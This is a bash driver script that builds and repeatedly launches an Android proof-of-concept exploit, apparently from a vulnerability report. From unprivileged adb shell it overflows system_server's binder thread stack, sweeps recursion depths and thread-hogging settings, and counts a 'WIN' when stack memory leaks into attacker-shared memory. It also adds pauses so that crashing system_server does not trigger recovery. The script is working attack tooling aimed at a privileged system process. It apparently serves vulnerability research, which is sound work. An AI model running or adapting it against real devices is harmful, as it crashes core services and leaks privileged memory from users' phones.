#!/bin/bash
# Build + drive the P0-465827985 shell->system_server PoC and classify each
# attempt by the mechanism's real signals. Runs entirely as unprivileged adb
# shell (uid 2000) -- root would defeat the point of the finding.
#
# Signals (see README):
#   - a SHELL_COMMAND or isFileFullyLoaded transaction returning DEAD_OBJECT
#     means a system_server binder thread overflowed its stack past the guard
#     page -> the vulnerability is present and reachable (missing -fstack-check).
#   - foreign bytes (outside {00,0a,aa}) in the sprayed shmem on top of that =
#     stack memory leaked into attacker-shared memory (the controlled win).
#
# Knobs (env):
#   DEPTHS   nested-recursion depths to sweep (default "131 140 150 160")
#   ITERS    attempts per depth (default 8; the win is ~5-10% per attempt)
#   HOG      binder threads to park in system_server (default 4; <16 or it hangs)
#   TMO      per-attempt timeout seconds (default 50)
#   DEVICE   adb serial (default: first attached)
#   NDK      NDK path (default: an installed 27.x, which still ships
#            binder_parcel_utils.h -- removed in 28+)
set -u
HERE="$(cd "$(dirname "$0")" && pwd)"
cd "$HERE"

NDK="${NDK:-}"
if [ -z "$NDK" ]; then
  # newest 27.x under $ANDROID_HOME/ndk (27.x has binder_parcel_utils.h)
  base="${ANDROID_HOME:-$HOME/Archives/Android}/ndk"
  NDK="$(ls -d "$base"/27.* 2>/dev/null | sort -V | tail -1)"
fi
[ -x "$NDK/ndk-build" ] || { echo "no NDK 27.x found (set NDK=...); looked under $base"; exit 1; }

D="${DEVICE:-$(adb devices | awk 'NR==2{print $1}')}"
[ -n "$D" ] || { echo "no adb device"; exit 1; }
DEPTHS="${DEPTHS:-131 140 150 160}"
ITERS="${ITERS:-8}"
HOG="${HOG:-4}"
TMO="${TMO:-50}"
OUT="${OUT:-$HERE/runlogs}"
mkdir -p "$OUT"

"$NDK/ndk-build" NDK_PROJECT_PATH="$HERE" NDK_APPLICATION_MK="$HERE/Application.mk" || exit 1
adb -s "$D" push libs/arm64-v8a/repro /data/local/tmp/ || exit 1

for depth in $DEPTHS; do
  win=0; overflow=0; noov=0; infra=0; down=0; other=0; ran=0
  for i in $(seq 1 "$ITERS"); do
    # health gate: never count an attempt against a dead/rebooting system_server
    if ! adb -s "$D" shell 'service check activity' 2>/dev/null | grep -q found; then
      down=$((down+1)); timeout 120 adb -s "$D" wait-for-device 2>/dev/null; sleep 5; continue
    fi
    f="$OUT/d${depth}_i${i}.log"
    timeout "$TMO" adb -s "$D" shell -tt "DP_DEPTH=$depth DP_NUM_HOG=$HOG /data/local/tmp/repro" >"$f" 2>&1
    rc=$?; ran=$((ran+1))
    res=$(grep -o 'DP_RESULT .*' "$f" | tail -1)
    if echo "$res" | grep -q 'leak=YES\|foreign=[1-9]'; then
      win=$((win+1)); echo "  depth=$depth i=$i *** WIN (stack leaked into shmem) *** $res"
      echo "  --> $f"; break 2
    elif echo "$res" | grep -q 'overflow=RECURSION'; then
      overflow=$((overflow+1)); echo "  depth=$depth i=$i system_server stack OVERFLOW (no leak): $res"
      sleep 12   # cool down after crashing system_server, to avoid Rescue Party
    elif echo "$res" | grep -q 'iffl_transport_err=1'; then
      overflow=$((overflow+1)); echo "  depth=$depth i=$i overflow at isFileFullyLoaded (no leak): $res"
      sleep 12
    elif echo "$res" | grep -q 'leak=NO'; then
      noov=$((noov+1))                        # ran clean, stack did not reach the guard
    elif [ "$rc" -eq 124 ] || grep -q 'createStorage failed' "$f"; then
      infra=$((infra+1))
    else
      other=$((other+1)); echo "  depth=$depth i=$i unclassified rc=$rc -> $f"
    fi
  done
  echo "depth=$depth : WIN=$win ss_overflow=$overflow no_overflow=$noov infra=$infra dev_down=$down other=$other (ran $ran/$ITERS)"
done
